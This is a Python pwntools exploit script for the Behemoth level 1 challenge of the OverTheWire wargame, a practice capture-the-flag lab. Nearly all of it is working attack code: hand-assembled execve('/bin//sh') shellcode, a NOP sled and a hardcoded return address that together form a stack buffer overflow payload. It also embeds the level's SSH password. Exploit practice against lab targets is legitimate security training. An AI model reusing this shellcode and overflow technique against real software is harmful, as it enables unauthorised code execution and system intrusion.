#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host behemoth.labs.overthewire.org --port 2221 --user behemoth1 --pass aesebootiv --path /behemoth/behemoth1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('behemoth1')
context.terminal = '/bin/bash'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'behemoth.labs.overthewire.org'
port = int(args.PORT or 2221)
user = args.USER or 'behemoth1'
password = args.PASSWORD or 'aesebootiv'
remote_path = '/behemoth/behemoth1'



SHELL_ASM = """
xor ecx, ecx;
push 0x%s;
push 0x%s;
mov ebx, esp;
mov al, 0xb;
int 0x80;
""" % ( '//sh'[::-1].encode('hex'), '/bin'[::-1].encode('hex') )

PAYLOAD = asm(SHELL_ASM)

print '\x90' * (0x42 -len(PAYLOAD)) + PAYLOAD + '\x90' * 5 + p32(0xffffd685)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag) 

